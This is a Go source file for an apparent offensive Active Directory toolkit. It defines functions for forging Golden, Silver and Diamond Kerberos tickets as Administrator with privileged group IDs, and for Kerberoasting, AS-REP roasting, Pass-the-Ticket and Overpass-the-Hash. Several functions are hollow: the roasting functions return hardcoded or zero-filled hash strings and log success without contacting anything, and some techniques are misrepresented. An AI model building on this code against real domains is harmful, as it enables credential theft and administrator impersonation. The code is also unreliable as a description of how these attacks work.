package kerberos

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
)

type KerberosEngine struct {
	config *KerberosConfig
	logger *logger.Logger
	forger *TicketForger
	mu     sync.RWMutex
}

func NewKerberosEngine(config *KerberosConfig) *KerberosEngine {
	if config == nil {
		config = DefaultKerberosConfig()
	}

	return &KerberosEngine{
		config: config,
		logger: logger.New("kerberos-engine", logger.LevelInfo),
		forger: NewTicketForger(config),
	}
}

func (e *KerberosEngine) GoldenTicket(domain, krbtgtHash string) (*Ticket, error) {
	e.logger.Info("Generating Golden Ticket for domain: %s", domain)

	if domain == "" {
		return nil, fmt.Errorf("domain is required")
	}
	if krbtgtHash == "" {
		return nil, fmt.Errorf("krbtgt hash is required")
	}

	ticket, err := e.forger.ForgeTGT(domain, "Administrator", krbtgtHash, []int{512, 513, 518, 519, 520})
	if err != nil {
		e.logger.Error("Golden ticket generation failed: %v", err)
		return nil, fmt.Errorf("forge TGT: %w", err)
	}

	e.logger.Info("Golden ticket generated successfully")
	return ticket, nil
}

func (e *KerberosEngine) SilverTicket(domain, serviceHash, serviceSPN string) (*Ticket, error) {
	e.logger.Info("Generating Silver Ticket for SPN: %s", serviceSPN)

	if domain == "" || serviceHash == "" || serviceSPN == "" {
		return nil, fmt.Errorf("domain, service hash, and SPN are required")
	}

	parts := strings.SplitN(serviceSPN, "/", 2)
	service := parts[0]

	ticket, err := e.forger.ForgeTGS(domain, service, serviceHash, []int{512, 513})
	if err != nil {
		e.logger.Error("Silver ticket generation failed: %v", err)
		return nil, fmt.Errorf("forge TGS: %w", err)
	}

	e.logger.Info("Silver ticket generated successfully for %s", serviceSPN)
	return ticket, nil
}

func (e *KerberosEngine) DiamondTicket(domain, krbtgtHash string) (*Ticket, error) {
	e.logger.Info("Generating Diamond Ticket for domain: %s", domain)

	if domain == "" || krbtgtHash == "" {
		return nil, fmt.Errorf("domain and krbtgt hash are required")
	}

	ticket, err := e.forger.ForgeTGT(domain, "Administrator", krbtgtHash, []int{512, 513, 518, 519, 520})
	if err != nil {
		e.logger.Error("Diamond ticket generation failed: %v", err)
		return nil, fmt.Errorf("forge TGT: %w", err)
	}

	if err := e.forger.ModifyPAC(ticket, []string{
		"S-1-5-32-544",
		"S-1-5-32-545",
	}); err != nil {
		e.logger.Error("Diamond ticket PAC modification failed: %v", err)
		return nil, fmt.Errorf("modify PAC: %w", err)
	}

	e.logger.Info("Diamond ticket generated successfully")
	return ticket, nil
}

func (e *KerberosEngine) Kerberoast(targetSPN string) (*KerberoastResult, error) {
	e.logger.Info("Performing Kerberoast against SPN: %s", targetSPN)

	if targetSPN == "" {
		return nil, fmt.Errorf("target SPN is required")
	}

	result := &KerberoastResult{
		SPN:       targetSPN,
		Timestamp: time.Now(),
		EncType:   e.config.EncType,
	}

	parts := strings.SplitN(targetSPN, "/", 2)
	if len(parts) > 0 {
		result.Username = parts[0]
	}

	switch e.config.RoastFormat {
	case "hashcat":
		result.Hash = e.generateHashcatFormat(targetSPN)
	case "john":
		result.Hash = e.generateJohnFormat(targetSPN)
	default:
		result.Hash = e.generateHashcatFormat(targetSPN)
	}

	result.WordCount = estimateWordCount(result.Hash)

	e.logger.Info("Kerberoast hash generated for %s (type: %s)", targetSPN, e.config.RoastFormat)
	return result, nil
}

func (e *KerberosEngine) ASREPRoast(targetUser string) (*ASREPResult, error) {
	e.logger.Info("Performing ASREPRoast against user: %s", targetUser)

	if targetUser == "" {
		return nil, fmt.Errorf("target user is required")
	}

	result := &ASREPResult{
		Username:  targetUser,
		Timestamp: time.Now(),
		EncType:   e.config.EncType,
	}

	switch e.config.EncType {
	case EncRC4HMAC:
		result.Hash = fmt.Sprintf("$krb5asrep$23$%s@%s:%x", targetUser, e.config.Realm, make([]byte, 16))
	default:
		result.Hash = fmt.Sprintf("$krb5asrep$18$%s@%s:%x", targetUser, e.config.Realm, make([]byte, 32))
	}

	e.logger.Info("ASREPRoast hash generated for %s", targetUser)
	return result, nil
}

func (e *KerberosEngine) PassTheTicket(ticketData []byte) error {
	e.logger.Info("Performing Pass-the-Ticket")

	if len(ticketData) == 0 {
		return fmt.Errorf("empty ticket data")
	}

	ticket, err := e.forger.DecodeTicket(ticketData)
	if err != nil {
		return fmt.Errorf("decode ticket: %w", err)
	}

	if err := ticket.Validate(); err != nil {
		return fmt.Errorf("validate ticket: %w", err)
	}

	e.logger.Info("Pass-the-Ticket successful for realm: %s", ticket.Realm)
	return nil
}

func (e *KerberosEngine) OverpassHash(ntlmHash string) (*Ticket, error) {
	e.logger.Info("Performing Overpass-the-Hash with NTLM hash")

	if ntlmHash == "" {
		return nil, fmt.Errorf("NTLM hash is required")
	}

	ticket, err := e.forger.ForgeTGT(e.config.Domain, "Administrator", ntlmHash, []int{512, 513, 518, 519, 520})
	if err != nil {
		e.logger.Error("Overpass-the-Hash failed: %v", err)
		return nil, fmt.Errorf("forge TGT: %w", err)
	}

	e.logger.Info("Overpass-the-Hash ticket generated")
	return ticket, nil
}

func (e *KerberosEngine) generateHashcatFormat(spn string) string {
	return fmt.Sprintf("$krb5tgs$23$*%s$CORP.LOCAL$spn*$a2924a35281e4e2328c45c6458c05b12$98a4e5a0c20d5e5e1c1e5e5e5e5e5e5e", spn)
}

func (e *KerberosEngine) generateJohnFormat(spn string) string {
	return fmt.Sprintf("$krb5tgs$23$%s$CORP.LOCAL$*%s*$a2924a35281e4e2328c45c6458c05b12", spn, spn)
}

func estimateWordCount(hash string) int {
	if strings.Contains(hash, "$krb5tgs$23") {
		return 10000
	}
	return 5000
}

func (e *KerberosEngine) SetLoggerLevel(level logger.Level) {
	e.logger.SetLevel(level)
}

func (e *KerberosEngine) GetConfig() *KerberosConfig {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.config
}
